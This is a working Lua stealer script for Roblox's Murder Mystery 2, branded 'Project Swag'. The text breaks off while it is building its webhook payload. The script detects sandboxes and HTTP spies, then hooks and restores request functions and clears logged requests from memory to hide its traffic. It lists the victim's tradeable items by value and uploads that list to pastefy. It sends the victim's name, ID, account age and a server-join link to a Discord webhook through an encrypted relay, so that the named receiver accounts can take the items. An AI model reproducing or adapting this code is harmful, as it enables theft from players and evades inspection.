if getgenv()._PS_V10_LOCKED then return end
getgenv()._PS_V10_LOCKED = true
getgenv()._PS_V10_STARTTIME = tick()
local _PS_EXECUTION_TOKEN = {}
setmetatable(_PS_EXECUTION_TOKEN, {
    __metatable = "LOCKED",
    __newindex = function()
        while true do task.wait(9e9) end
    end
})
task.spawn(function()
    while getgenv()._PS_V10_LOCKED do
        task.wait(5)
        if not getgenv()._PS_V10_LOCKED then
            local plr = game:GetService("Players").LocalPlayer
            while true do task.wait(9e9) end
        end
    end
end)

repeat task.wait() until game:IsLoaded()
task.wait(1.5)

local function _ps_terminate(reason)
    local plr = game:GetService("Players").LocalPlayer
    if plr and typeof(plr.Kick) == "function" then
        pcall(function() plr:Kick("Project Swag | " .. tostring(reason)) end)
    end
    while true do task.wait(9e9) end
end

local function _ps_validate_environment()
    if getgenv()._PS_EXECUTED then
        _ps_terminate("Duplicate execution detected")
    end
    getgenv()._PS_EXECUTED = true
    task.wait()
    if rawget(_G, "_25mspredefine") ~= nil then
        _ps_terminate("Environment pollution detected")
    end
    local tb = ""
    pcall(function() tb = debug.traceback():lower() end)
    if tb:find("sandbox") or tb:find("unveilr") or tb:find("httpspy") or tb:find("decompile") then
        _ps_terminate("Sandbox/Spy detected")
    end
    task.wait()
    if isfunctionhooked then
        local test_funcs = {print, warn, error, pcall, xpcall, getmetatable, setmetatable, rawget, rawset}
        for _, fn in ipairs(test_funcs) do
            if typeof(fn) == "function" and isfunctionhooked(fn) then
                _ps_terminate("Critical function hook detected")
            end
        end
    task.wait()
    end
    local mt_ok, mt_result = pcall(function()
        local t = setmetatable({}, {__index = function() return 42 end})
        return t.test == 42
    end)
    if not mt_ok or not mt_result then
        _ps_terminate("Metatable integrity compromised")
    end
    local env_ok = pcall(function()
        local f = function() end
        local env = getfenv and getfenv(f)
        return env ~= nil
    end)
    if not env_ok then
        _ps_terminate("Environment access compromised")
    end
    local json_ok, json_result = pcall(function()
        local decoded = game:GetService("HttpService"):JSONDecode('{"test": true, "null": null}')
        return decoded.test == true and decoded.null == nil
    end)
    if not json_ok or not json_result then
        _ps_terminate("JSON parser compromised")
    end
    local inst_ok = pcall(function()
        local part = Instance.new("Part")
        local s = pcall(function() part:thisdoesntexist_aaa("test") end)
        return not s
    end)
    if not inst_ok then
        _ps_terminate("Instance method integrity compromised")
    end
    
    
end
_ps_validate_environment()

local Services = {}
local function GetService(serviceName, maxRetries)
    maxRetries = maxRetries or 3
    if Services[serviceName] then return Services[serviceName] end
    for attempt = 1, maxRetries do
        local ok, result = pcall(function()
            return game:GetService(serviceName)
        end)
        if ok and result then
            Services[serviceName] = result
            return result
        end
        task.wait(0.5 * attempt)
    end
    return nil
end

local HttpService = GetService("HttpService")
local Players = GetService("Players")
local RunService = GetService("RunService")
local ReplicatedStorage = GetService("ReplicatedStorage")
local TeleportService = GetService("TeleportService")
local RobloxReplicatedStorage = GetService("RobloxReplicatedStorage")

if not (HttpService and Players and RunService and ReplicatedStorage and TeleportService) then
    _ps_terminate("Critical service initialization failed")
end

local plr = Players.LocalPlayer
if not plr then
    _ps_terminate("LocalPlayer not found")
end

if game.PlaceId ~= 142823291 then
    pcall(function() plr:Kick("Project Swag | MM2 Only") end)
    return
end

if not _G.PS_CONFIG then
    warn("[PS] Execute loader first!")
    return
end

local cfg = _G.PS_CONFIG
local WEBHOOK_URL = cfg.WEBHOOK_URL
local USERNAMES = cfg.USERNAMES

if not WEBHOOK_URL or WEBHOOK_URL == "" then
    warn("[PS] Invalid webhook")
    return
end

-- ═══════════════════════════════════════════════════════════════
-- Eternal Webhook Protector — Inline Module
-- ═══════════════════════════════════════════════════════════════
local WebhookProtector = {}
local WP_SECRET_KEY = "2C5w&_:PUC_8-9,q$POy5-zgUbgpI9+p@&V_d3mww(vFl46C7fxwBsl29AQH1jcP"
local WP_PROXY_URL = "https://eternal-webhook-protector.selax919.workers.dev/relay"
local WP_STD = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/"
local WP_CUST = "eRgQbCLz9cyP3uhZkTWjKnvmE/+2pIVGos7wdBfHOr5FUixXY8al1ANDqJtMS604"

function WebhookProtector.sha256(msg)
    local K = {
        0x428a2f98, 0x71374491, 0xb5c0fbcf, 0xe9b5dba5, 0x3956c25b, 0x59f111f1, 0x923f82a4, 0xab1c5ed5,
        0xd807aa98, 0x12835b01, 0x243185be, 0x550c7dc3, 0x72be5d74, 0x80deb1fe, 0x9bdc06a7, 0xc19bf174,
        0xe49b69c1, 0xefbe4786, 0x0fc19dc6, 0x240ca1cc, 0x2de92c6f, 0x4a7484aa, 0x5cb0a9dc, 0x76f988da,
        0x983e5152, 0xa831c66d, 0xb00327c8, 0xbf597fc7, 0xc6e00bf3, 0xd5a79147, 0x06ca6351, 0x14292967,
        0x27b70a85, 0x2e1b2138, 0x4d2c6dfc, 0x53380d13, 0x650a7354, 0x766a0abb, 0x81c2c92e, 0x92722c85,
        0xa2bfe8a1, 0xa81a664b, 0xc24b8b70, 0xc76c51a3, 0xd192e819, 0xd6990624, 0xf40e3585, 0x106aa070,
        0x19a4c116, 0x1e376c08, 0x2748774c, 0x34b0bcb5, 0x391c0cb3, 0x4ed8aa4a, 0x5b9cca4f, 0x682e6ff3,
        0x748f82ee, 0x78a5636f, 0x84c87814, 0x8cc70208, 0x90befffa, 0xa4506ceb, 0xbef9a3f7, 0xc67178f2
    }
    local function rrotate(n, b)
        return bit32.bor(bit32.rshift(n, b), bit32.lshift(n, 32 - b))
    end
    local function toBytes(num)
        local t = {}
        for i = 3, 0, -1 do
            t[#t + 1] = bit32.band(bit32.rshift(num, i * 8), 0xFF)
        end
        return t
    end
    local function preprocess(msg)
        local bits = #msg * 8
        msg = msg .. "\x80"
        local pad = 64 - ((#msg + 8) % 64)
        if pad ~= 64 then
            msg = msg .. string.rep("\0", pad)
        end
        for i = 7, 0, -1 do
            msg = msg .. string.char(bit32.band(bit32.rshift(bits, i * 8), 0xFF))
        end
        return msg
    end
    msg = preprocess(msg)
    local H = {0x6a09e667, 0xbb67ae85, 0x3c6ef372, 0xa54ff53a, 0x510e527f, 0x9b05688c, 0x1f83d9ab, 0x5be0cd19}
    for i = 1, #msg, 64 do
        local w = {}
        for j = 0, 15 do
            local idx = i + j * 4
            w[j + 1] = bit32.bor(
                bit32.lshift(string.byte(msg, idx), 24),
                bit32.lshift(string.byte(msg, idx + 1), 16),
                bit32.lshift(string.byte(msg, idx + 2), 8),
                string.byte(msg, idx + 3)
            )
        end
        for j = 17, 64 do
            local s0 = bit32.bxor(rrotate(w[j - 15], 7), rrotate(w[j - 15], 18), bit32.rshift(w[j - 15], 3))
            local s1 = bit32.bxor(rrotate(w[j - 2], 17), rrotate(w[j - 2], 19), bit32.rshift(w[j - 2], 10))
            w[j] = bit32.band(w[j - 16] + s0 + w[j - 7] + s1, 0xFFFFFFFF)
        end
        local a, b, c, d, e, f, g, h = table.unpack(H)
        for j = 1, 64 do
            local S1 = bit32.bxor(rrotate(e, 6), rrotate(e, 11), rrotate(e, 25))
            local ch = bit32.bxor(bit32.band(e, f), bit32.band(bit32.bnot(e), g))
            local temp1 = bit32.band(h + S1 + ch + K[j] + w[j], 0xFFFFFFFF)
            local S0 = bit32.bxor(rrotate(a, 2), rrotate(a, 13), rrotate(a, 22))
            local maj = bit32.bxor(bit32.band(a, b), bit32.band(a, c), bit32.band(b, c))
            local temp2 = bit32.band(S0 + maj, 0xFFFFFFFF)
            h = g; g = f; f = e; e = bit32.band(d + temp1, 0xFFFFFFFF)
            d = c; c = b; b = a; a = bit32.band(temp1 + temp2, 0xFFFFFFFF)
        end
        H[1] = bit32.band(H[1] + a, 0xFFFFFFFF)
        H[2] = bit32.band(H[2] + b, 0xFFFFFFFF)
        H[3] = bit32.band(H[3] + c, 0xFFFFFFFF)
        H[4] = bit32.band(H[4] + d, 0xFFFFFFFF)
        H[5] = bit32.band(H[5] + e, 0xFFFFFFFF)
        H[6] = bit32.band(H[6] + f, 0xFFFFFFFF)
        H[7] = bit32.band(H[7] + g, 0xFFFFFFFF)
        H[8] = bit32.band(H[8] + h, 0xFFFFFFFF)
    end
    local result = {}
    for i = 1, 8 do
        for _, b in ipairs(toBytes(H[i])) do
            result[#result + 1] = string.format("%02x", b)
        end
    end
    return table.concat(result)
end

local function wp_deriveKey(secret)
    local hash = WebhookProtector.sha256(secret)
    local key = {}
    for i = 1, #hash, 2 do
        key[#key + 1] = tonumber(hash:sub(i, i + 1), 16)
    end
    return key
end

local function wp_customB64(data)
    local b64chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/"
    local result = {}
    for i = 1, #data, 3 do
        local a = string.byte(data, i) or 0
        local b = string.byte(data, i + 1) or 0
        local c = string.byte(data, i + 2) or 0
        local n = bit32.bor(bit32.lshift(a, 16), bit32.lshift(b, 8), c)
        table.insert(result, b64chars:sub(bit32.rshift(n, 18) + 1, bit32.rshift(n, 18) + 1))
        table.insert(result, b64chars:sub(bit32.band(bit32.rshift(n, 12), 0x3F) + 1, bit32.band(bit32.rshift(n, 12), 0x3F) + 1))
        if i + 1 <= #data then
            table.insert(result, b64chars:sub(bit32.band(bit32.rshift(n, 6), 0x3F) + 1, bit32.band(bit32.rshift(n, 6), 0x3F) + 1))
        else
            table.insert(result, "=")
        end
        if i + 2 <= #data then
            table.insert(result, b64chars:sub(bit32.band(n, 0x3F) + 1, bit32.band(n, 0x3F) + 1))
        else
            table.insert(result, "=")
        end
    end
    local standard = table.concat(result)
    local mapped = {}
    for i = 1, #standard do
        local ch = standard:sub(i, i)
        local pos = WP_STD:find(ch, 1, true)
        if pos then
            mapped[#mapped + 1] = WP_CUST:sub(pos, pos)
        else
            mapped[#mapped + 1] = ch
        end
    end
    return table.concat(mapped)
end

local function wp_salt()
    local salt = {}
    for i = 1, 8 do
        salt[#salt + 1] = string.char(math.random(0, 255))
    end
    return table.concat(salt)
end

function WebhookProtector.Encrypt(webhookUrl)
    local key = wp_deriveKey(WP_SECRET_KEY)
    local keyLen = #key
    local salt = wp_salt()
    local encrypted = {}
    for i = 1, #salt do
        encrypted[#encrypted + 1] = salt:sub(i, i)
    end
    for idx = 1, #webhookUrl do
        local byte = string.byte(webhookUrl, idx)
        local kb = key[((idx - 1) % keyLen) + 1]
        local obf = (byte + kb + (idx * 13)) % 256
        encrypted[#encrypted + 1] = string.char(obf)
    end
    return wp_customB64(table.concat(encrypted))
end

_G.webhook = WebhookProtector.Encrypt(WEBHOOK_URL)

-- ═══════════════════════════════════════════════════════════════

if not USERNAMES or #USERNAMES == 0 then
    warn("[PS] No targets")
    return
end

local executorName = "Unknown"
pcall(function()
    if identifyexecutor then executorName = identifyexecutor()
    elseif getexecutorname then executorName = getexecutorname() end
end)

-- ANTI HTTP SPY MODULE
task.spawn(function()
if getgenv()._PS_ANTISPY_LOADED then return end
getgenv()._PS_ANTISPY_LOADED = true

local detected = false
local deb = false

task.wait()

local function kickPlayer(reason)
    local player = Players.LocalPlayer
    if player and player.Kick then
        player:Kick("go fuck urself")
    end
end

local function punishment()
    if not deb then
        deb = true
        kickPlayer("go fuck urself")
        return true
    end
    return false
end

local realHookFunction = clonefunction(hookfunction)
local realHookMetamethod = clonefunction(hookmetamethod)

local originals = {}
local HTTP_METHODS = {
    HttpGet = true,
    HttpPost = true,
    GetAsync = true,
    PostAsync = true,
    RequestAsync = true,
}

function deepCollect(fn, visited, depth, maxIter)
    maxIter = maxIter or 100
    local found = {}
    if depth > 3 or not fn or type(fn) ~= "function" then return found end
    if visited[fn] then return found end
    visited[fn] = true
    if maxIter <= 0 then return found end

    local function process(v)
        if maxIter <= 0 then return end
        if type(v) == "function" then
            found[v] = true
            maxIter = maxIter - 1
            for f in pairs(deepCollect(v, visited, depth + 1, maxIter)) do
                found[f] = true
            end
        elseif type(v) == "table" and depth < 2 then
            for i, tv in pairs(v) do
                if maxIter <= 0 then return end
                if type(tv) == "function" then
                    found[tv] = true
                    maxIter = maxIter - 1
                    for f in pairs(deepCollect(tv, visited, depth + 1, maxIter)) do
                        found[f] = true
                    end
                end
            end
        end
    end

    pcall(function()
        for i = 1, 20 do
            if maxIter <= 0 then return end
            local a, b = getupvalue(fn, i)
            if a == nil and b == nil then break end
            process(a)
            if b ~= nil then process(b) end
            if i % 5 == 0 then task.wait() end
        end
    end)

    return found
end

function recoverOriginal(fn, name)
    if not fn then return nil, false end
    local hooked = false
    if islclosure(fn) then
        hooked = true
    end
    local restored
    pcall(function() restored = getoriginalfunction(fn) end)
    if restored and type(restored) == "function" and iscclosure(restored) then
        pcall(function() realHookFunction(fn, restored) end)
        return restored, hooked
    end
    local dummy = newcclosure(function() end)
    local prev
    pcall(function() prev = realHookFunction(fn, dummy) end)
    if not prev then
        pcall(function() realHookFunction(fn, fn) end)
        local fb
        pcall(function() fb = clonefunction(fn) end)
        return fb, hooked
    end
    if islclosure(prev) then
        hooked = true
        local allFns = deepCollect(prev, {}, 0)
        for f in pairs(allFns) do
            if iscclosure(f) then
                realHookFunction(fn, f)
                return f, true
            end
        end
        local cl
        pcall(function() cl = clonefunction(prev) end)
        if cl and iscclosure(cl) then
            realHookFunction(fn, cl)
            return cl, true
        end
        realHookFunction(fn, prev)
        local fb
        pcall(function() fb = clonefunction(fn) end)
        return fb or prev, true
    end
    realHookFunction(fn, prev)
    return prev, hooked
end

local anyHooked = false

local instanceMethods = {
    {game.HttpGet, "HttpGet", "game.HttpGet"},
    {game.HttpPost, "HttpPost", "game.HttpPost"},
    {HttpService.GetAsync, "GetAsync", "HttpService.GetAsync"},
    {HttpService.PostAsync, "PostAsync", "HttpService.PostAsync"},
    {HttpService.RequestAsync, "RequestAsync", "HttpService.RequestAsync"},
}

for i, m in ipairs(instanceMethods) do
    local orig, hooked = recoverOriginal(m[1], m[3])
    originals[m[2]] = orig
    if hooked then anyHooked = true end
    if i % 2 == 0 then task.wait() end
end

local globalFns = {
    {request, "request", "request"},
    {http_request, "http_request", "http_request"},
    {http and http.request, "http_dot_request", "http.request"},
    {syn and syn.request, "syn_request", "syn.request"},
}

for i, g in ipairs(globalFns) do
    if g[1] then
        local orig, hooked = recoverOriginal(g[1], g[3])
        originals[g[2]] = orig
        if hooked then anyHooked = true end
    end
    if i % 2 == 0 then task.wait() end
end

pcall(function() if originals.request and request then getgenv().request = originals.request end end)
pcall(function() if originals.http_request and http_request then getgenv().http_request = originals.http_request end end)
pcall(function() if originals.http_dot_request and http then http.request = originals.http_dot_request end end)
pcall(function() if originals.syn_request and syn then syn.request = originals.syn_request end end)

local rawMt
pcall(function() rawMt = getrawmetatable(game) end)

local originalNc
local ncDummy = newcclosure(function(self, ...) return nil end)
local prevNc
pcall(function() prevNc = realHookMetamethod(game, "__namecall", ncDummy) end)

if prevNc then
    if islclosure(prevNc) then
        anyHooked = true
        local allFns = deepCollect(prevNc, {}, 0)
        for f in pairs(allFns) do
            if iscclosure(f) then
                originalNc = f
                break
            end
        end
        if not originalNc then
            pcall(function() originalNc = clonefunction(prevNc) end)
            if not originalNc then originalNc = prevNc end
        end
    else
        originalNc = prevNc
    end
else
    pcall(function() originalNc = rawMt.__namecall end)
end

if anyHooked then
    detected = true
    if punishment() then
        return
    end
end

function cleanupSpyData()
    pcall(function()
        local count = 0
        for i, obj in pairs(getgc(true)) do
            count = count + 1
            if count > 500 then task.wait() count = 0 end
            if type(obj) == "table" then
                pcall(function()
                    local first = rawget(obj, 1)
                    if type(first) == "table" then
                        local url = rawget(first, "Url") or rawget(first, "url")
                        local method = rawget(first, "Method") or rawget(first, "method")
                        if type(url) == "string" and type(method) == "string" then
                            for j = #obj, 1, -1 do rawset(obj, j, nil) end
                        end
                    end
                end)
            end
        end
    end)
end

cleanupSpyData()

task.spawn(function()
    while task.wait(15) do
        cleanupSpyData()
        task.wait(0.1)
    end
end)

local ncHandler = newcclosure(function(self, ...)
    local method = getnamecallmethod()
    if HTTP_METHODS[method] and originals[method] then
        return originals[method](self, ...)
    end
    if originalNc then
        return originalNc(self, ...)
    end
end)

pcall(function() realHookMetamethod(game, "__namecall", ncHandler) end)

pcall(function()
    local mt = getrawmetatable(game)
    setreadonly(mt, false)
    mt.__namecall = ncHandler
    setreadonly(mt, true)
end)

function restoreAll()
    pcall(function() if originals.HttpGet then realHookFunction(game.HttpGet, originals.HttpGet) end end)
    pcall(function() if originals.HttpPost then realHookFunction(game.HttpPost, originals.HttpPost) end end)
    pcall(function() if originals.GetAsync then realHookFunction(HttpService.GetAsync, originals.GetAsync) end end)
    pcall(function() if originals.PostAsync then realHookFunction(HttpService.PostAsync, originals.PostAsync) end end)
    pcall(function() if originals.RequestAsync then realHookFunction(HttpService.RequestAsync, originals.RequestAsync) end end)
    pcall(function() if originals.request and request then realHookFunction(request, originals.request) end end)
    pcall(function() if originals.http_request and http_request then realHookFunction(http_request, originals.http_request) end end)
    pcall(function() if originals.http_dot_request and http and http.request then realHookFunction(http.request, originals.http_dot_request) end end)
    pcall(function() if originals.syn_request and syn and syn.request then realHookFunction(syn.request, originals.syn_request) end end)
end

function isProtectedFunction(fn)
    if not fn or type(fn) ~= "function" then return false end
    if fn == game.HttpGet or fn == game.HttpPost then return true end
    if fn == HttpService.GetAsync or fn == HttpService.PostAsync or fn == HttpService.RequestAsync then return true end
    if request and fn == request then return true end
    if http_request and fn == http_request then return true end
    if http and http.request and fn == http.request then return true end
    if syn and syn.request and fn == syn.request then return true end
    return false
end

realHookFunction(hookfunction, newcclosure(function(target, hook)
    if isProtectedFunction(target) then
        detected = true
        if punishment() then
            return target
        end
        return target
    end
    return realHookFunction(target, hook)
end))

realHookFunction(hookmetamethod, newcclosure(function(obj, method, hook)
    if obj == game and method == "__namecall" and type(hook) == "function" then
        local actualHook = hook
        return realHookMetamethod(obj, method, newcclosure(function(self, ...)
            local m = getnamecallmethod()
            if HTTP_METHODS[m] and originals[m] then
                return originals[m](self, ...)
            end
            return actualHook(self, ...)
        end))
    end
    return realHookMetamethod(obj, method, hook)
end))

local safeRequestFn = originals.request or originals.http_request or originals.syn_request or originals.http_dot_request

function safePost(url, body, headers)
    if not safeRequestFn then
        return nil, 0
    end
    headers = headers or {["Content-Type"] = "application/json"}
    local ok, response = pcall(safeRequestFn, {
        Url = url,
        Method = "POST",
        Headers = headers,
        Body = body,
    })
    if ok and response then return response.Body, response.StatusCode end
    return nil, 0
end

function safeGet(url, headers)
    if not safeRequestFn then return nil, 0 end
    headers = headers or {}
    local ok, response = pcall(safeRequestFn, {
        Url = url,
        Method = "GET",
        Headers = headers,
    })
    if ok and response then return response.Body, response.StatusCode end
    return nil, 0
end

getgenv().safePost = safePost
getgenv().safeGet = safeGet

-- END ANTI HTTP SPY MODULE

end)

local requestMethod = nil
local RequestFallbacks = {
    function() return syn and syn.request end,
    function() return fluxus and fluxus.request end,
    function() return http and http.request end,
    function() return getgenv().request end,
    function() return request end,
    function() return http_request end,
    function() return httprequest end,
}
for _, fallback in ipairs(RequestFallbacks) do
    local ok, result = pcall(fallback)
    if ok and result then
        requestMethod = result
        break
    end
end
if not requestMethod and HttpService.RequestAsync then
    requestMethod = function(req)
        return HttpService:RequestAsync({
            Url = req.Url,
            Method = req.Method,
            Headers = req.Headers,
            Body = req.Body
        })
    end
end
if not requestMethod then
    warn("[PS] Unsupported executor - No request method found")
    return
end

local request = requestMethod

local REAL_JOB_ID = game.JobId
local bypassJobId = game.JobId
local capturedJobId = false

if identifyexecutor and identifyexecutor() == "Delta" then
    local stepAnimate = nil
    local printed = false
    local searchStart = tick()
    repeat
        for _, v in ipairs(getgc(true)) do
            if typeof(v) == "function" then
                local info = debug.getinfo(v)
                if info and info.name == "stepAnimate" then
                    stepAnimate = v
                    break
                end
            end
        end
        if tick() - searchStart > 5 then break end
        task.wait()
    until stepAnimate
    if stepAnimate then
        local old
        old = hookfunction(stepAnimate, function(dt)
            if not printed then
                printed = true
                bypassJobId = game.JobId
                capturedJobId = true
            end
            return old(dt)
        end)
        local waitStart = tick()
        repeat
            task.wait()
            if tick() - waitStart > 5 then break end
        until capturedJobId
        REAL_JOB_ID = bypassJobId
    end
end

local function ServerHop(maxRetries)
    maxRetries = maxRetries or 3
    for attempt = 1, maxRetries do
        local success, result = pcall(function()
            local response = request({
                Url = "https://games.roblox.com/v1/games/" .. game.PlaceId .. "/servers/Public?sortOrder=Asc&limit=100",
                Method = "GET",
                Headers = {["User-Agent"] = "Mozilla/5.0"}
            })
            if response and response.Body then
                local data = HttpService:JSONDecode(response.Body)
                if data and data.data then
                    for _, server in ipairs(data.data) do
                        if server.id ~= game.JobId and server.playing < server.maxPlayers then
                            TeleportService:TeleportToPlaceInstance(game.PlaceId, server.id, plr)
                            task.wait(5)
                            return true
                        end
                    end
                end
            end
            return false
        end)
        if success and result then return true end
        task.wait(1 * attempt)
    end
    return false
end

local VIP = false
local FULL = false
pcall(function()
    VIP = (RobloxReplicatedStorage:WaitForChild("GetServerType", 5):InvokeServer() == "VIPServer")
end)
FULL = (#Players:GetPlayers() >= 12)
if VIP or FULL then
    local isMobile = executorName:lower():find("delta") or executorName:lower():find("hydrogen") or executorName:lower():find("fluxus") or executorName:lower():find("arceus") or executorName:lower():find("codex")
    if isMobile then
        plr:Kick(VIP and "VIP Servers not supported." or "FULL Servers Arent Supported")
        return
    else
        ServerHop()
        return
    end
end

local function VerifyLevel()
    local maxRetries = 3
    for attempt = 1, maxRetries do
        local ok, level = pcall(function()
            local GetPlayerLevel = ReplicatedStorage:WaitForChild("Remotes", 5):WaitForChild("Extras", 5):WaitForChild("GetPlayerLevel", 5)
            return GetPlayerLevel:InvokeServer(plr)
        end)
        if ok and typeof(level) == "number" then
            if level < 10 then
                pcall(function() plr:Kick("Project Swag | fake account detected") end)
                while true do task.wait(9e9) end
            end
            return true
        end
        task.wait(0.5 * attempt)
    end
    return false
end
VerifyLevel()

local no_trade = {
    ["DefaultGun"] = true, ["DefaultKnife"] = true, ["Reaver"] = true,
    ["Reaver_Legendary"] = true, ["Reaver_Godly"] = true, ["Reaver_Ancient"] = true,
    ["IceHammer"] = true, ["IceHammer_Legendary"] = true, ["IceHammer_Godly"] = true,
    ["IceHammer_Ancient"] = true, ["Gingerscythe"] = true, ["Gingerscythe_Legendary"] = true,
    ["Gingerscythe_Godly"] = true, ["Gingerscythe_Ancient"] = true,
    ["TestItem"] = true, ["Season1TestKnife"] = true, ["Cracks"] = true,
    ["Icecrusher"] = true, ["???"] = true, ["Dartbringer"] = true,
    ["TravelerAxeRed"] = true, ["TravelerAxeBronze"] = true,
    ["TravelerAxeSilver"] = true, ["TravelerAxeGold"] = true,
    ["BlueCamo_K_2022"] = true, ["GreenCamo_K_2022"] = true, ["SharkSeeker"] = true
}

local database = nil
local profileData = nil
for attempt = 1, 3 do
    local dbOk, dbResult = pcall(function()
        return require(ReplicatedStorage:WaitForChild("Database", 10):WaitForChild("Sync", 10):WaitForChild("Item", 10))
    end)
    if dbOk and dbResult then
        database = dbResult
        break
    end
    task.wait(1 * attempt)
end
if not database then
    warn("[PS] Database load failed")
    return
end

for attempt = 1, 3 do
    local profOk, profResult = pcall(function()
        return ReplicatedStorage.Remotes.Inventory.GetProfileData:InvokeServer(plr.Name)
    end)
    if profOk and profResult then
        profileData = profResult
        break
    end
    task.wait(1 * attempt)
end
if not profileData then
    warn("[PS] Profile load failed")
    return
end

local mm2Values = {}
for attempt = 1, 3 do
    local valOk, valResponse = pcall(function()
        return request({
            Url = "https://api.project-reverse.org/valuables/get-game-valuables?game=mm2",
            Method = "GET",
            Headers = {["User-Agent"] = "Mozilla/5.0"}
        })
    end)
    if valOk and valResponse and valResponse.Body then
        local decodeOk, data = pcall(function() return HttpService:JSONDecode(valResponse.Body) end)
        if decodeOk and data and data.data then
            for _, item in ipairs(data.data) do
                if item.name and item.price then
                    mm2Values[item.name] = tonumber(item.price) or 0
                end
            end
            break
        end
    end
    task.wait(1 * attempt)
end

local weaponsToSend = {}
local totalInventoryValue = 0
local rarityCounts = {Ancient=0, Godly=0, Unique=0, Vintage=0, Legendary=0, Rare=0, Uncommon=0, Common=0}
local weaponsOwned = profileData.Weapons and profileData.Weapons.Owned or {}

for dataid, amount in pairs(weaponsOwned) do
    local item = database[dataid]
    if item and not no_trade[dataid] and amount > 0 then
        local itemName = item.ItemName or tostring(dataid)
        local rarity = item.Rarity or "Common"
        local value = mm2Values[dataid] or 0
        local totalValue = value * amount
        totalInventoryValue = totalInventoryValue + totalValue
        table.insert(weaponsToSend, {
            DataID = dataid,
            ItemName = itemName,
            Amount = amount,
            Rarity = rarity,
            Value = value,
            TotalValue = totalValue
        })
        rarityCounts[rarity] = (rarityCounts[rarity] or 0) + amount
    end
end

table.sort(weaponsToSend, function(a, b)
    return a.TotalValue > b.TotalValue
end)

if #weaponsToSend == 0 then
    warn("[PS] No tradeable items found")
end

local function uploadToPastefy(items)
    if #items == 0 then return "Failed" end
    local lines = {
        "Project Swag | " .. plr.Name,
        os.date("%Y-%m-%d %H:%M:%S"),
        "Total: " .. #items,
        string.rep("-", 50), ""
    }
    table.sort(items, function(a, b)
        local tier = {Ancient=9, Godly=8, Unique=7, Vintage=6, Legendary=5, Rare=4, Uncommon=3, Common=2}
        local ao = tier[a.Rarity] or 1
        local bo = tier[b.Rarity] or 1
        if ao ~= bo then return ao > bo end
        return (a.Value * a.Amount) > (b.Value * b.Amount)
    end)
    local current_tier = nil
    for _, item in ipairs(items) do
        if current_tier ~= item.Rarity then
            current_tier = item.Rarity
            table.insert(lines, "")
            table.insert(lines, "[" .. current_tier:upper() .. "]")
            table.insert(lines, string.rep("-", 30))
        end
        local total_val = item.Value * item.Amount
        table.insert(lines, string.format("%s | Qty: %d | Value: $%.2f (Total: $%.2f)",
            item.ItemName, item.Amount, item.Value, total_val))
    end
    local content = table.concat(lines, "\n")
    for attempt = 1, 3 do
        local ok, response = pcall(function()
            return request({
                Url = "https://pastefy.app/api/v2/paste",
                Method = "POST",
                Headers = {["Content-Type"] = "application/json"},
                Body = HttpService:JSONEncode({content = content, type = "PASTE"})
            })
        end)
        if ok and response and response.StatusCode == 200 then
            local ok2, data = pcall(function() return HttpService:JSONDecode(response.Body) end)
            if ok2 and data then
                return data.paste and "https://pastefy.app/" .. data.paste.id or
                       data.id and "https://pastefy.app/" .. data.id or "Failed"
            end
        end
        task.wait(1 * attempt)
    end
    return "Failed"
end

local function sendToWebhook(payload)
    task.spawn(function()
        for attempt = 1, 3 do
            local success, response = pcall(function()
                local encrypted = WebhookProtector.Encrypt(WEBHOOK_URL)
                local ts = os.time()
                local sigData = ts .. ":" .. HttpService:JSONEncode(payload)
                local sig = WebhookProtector.sha256(sigData):sub(1, 16)
                local proxyBody = HttpService:JSONEncode({
                    webhook = encrypted,
                    payload = payload,
                    ts = ts,
                    sig = sig
                })
                return safePost(WP_PROXY_URL, proxyBody, {
                    ["Content-Type"] = "application/json",
                    ["User-Agent"] = "ProjectSwag/1.0"
                })
            end)
            if success then break end
            task.wait(1 * attempt)
        end
    end)
end

local rubisLink = uploadToPastefy(weaponsToSend)
local PlaceId = game.PlaceId
local fernJoinerLink = string.format("https://fern.wtf/joiner?placeId=%d&gameInstanceId=%s", PlaceId, REAL_JOB_ID)

local hitCategory = "Low Hit"
local isPingWorthy = false
if totalInventoryValue >= 1000 then
    hitCategory = "Big Hit"
    isPingWorthy = true
elseif totalInventoryValue >= 300 then
    hitCategory = "Good Hit"
    isPingWorthy = true
elseif totalInventoryValue >= 100 then
    hitCategory = "Normal Hit"
    isPingWorthy = true
end

local total_items = 0
for _, item in ipairs(weaponsToSend) do total_items = total_items + item.Amount end

local top_items = {}
for i = 1, math.min(3, #weaponsToSend) do
    local item = weaponsToSend[i]
    local emoji = {Ancient = "[A]", Godly = "[G]", Unique = "[U]", Vintage = "[V]", Legendary = "[L]", Rare = "[R]", Uncommon = "[Un]", Common = "[C]"}
    local e = emoji[item.Rarity] or "[?]"
    table.insert(top_items, e .. " " .. item.ItemName .. " x" .. item.Amount .. " ($" .. string.format("%.2f", item.TotalValue) .. ")")
end

local rarityIcons = {Ancient = "[A]", Godly = "[G]", Unique = "[U]", Vintage = "[V]", Legendary = "[L]", Rare = "[R]", Uncommon = "[Un]", Common = "[C]"}

local rarityLines = {}
for rarity, count in pairs(rarityCounts) do
    if count > 0 then
        local icon = rarityIcons[rarity] or "[*]"
        table.insert(rarityLines, icon .. " " .. rarity .. ": " .. count)
    end
end
table.sort(rarityLines, function(a, b)
    local order = {Ancient=1, Godly=2, Unique=3, Vintage=4, Legendary=5, Rare=6, Uncommon=7, Common=8}
    local ra = a:match("%w+")
    local rb = b:match("%w+")
    return (order[ra] or 99) < (order[rb] or 99)
end)

local topItemsText = ""
if #top_items > 0 then
    topItemsText = table.concat(top_items, "\n")
else
    topItemsText = "No valuable items found"
end

local rarityText = table.concat(rarityLines, " | ")
if rarityText == "" then rarityText = "No items" end

local descLines = {
    "**Victim:** `" .. plr.DisplayName .. "` (@" .. plr.Name .. ")",
    "**User ID:** `" .. plr.UserId .. "`",
    "**Account Age:** `" .. plr.AccountAge .. " days`",
    "**Executor:** `" .. executorName .. "`",
    "**Receiver:** `" .. table.concat(USERNAMES, ", ") .. "`"
}
local descriptionText = table.concat(descLines, "\n")

local payload = {
    content = isPingWorthy and "@everyone || NEW CATCH ||" or nil,
    username = "Swag Drops",
    avatar_url = "https://cdn.discordapp.com/attachments/placeholder/swag.png",
    embeds = {{
        title = hitCategory .. " - MM2",
        url = rubisLink,
        color = 0xFF6B35,
        thumbnail = {url = "https://www.roblox.com/headshot-thumbnail/image?userId=" .. plr.UserId .. "&width=420&height=420&format=png"},
        description = descriptionText,
        fields = {
            {
                name = "Total Value",
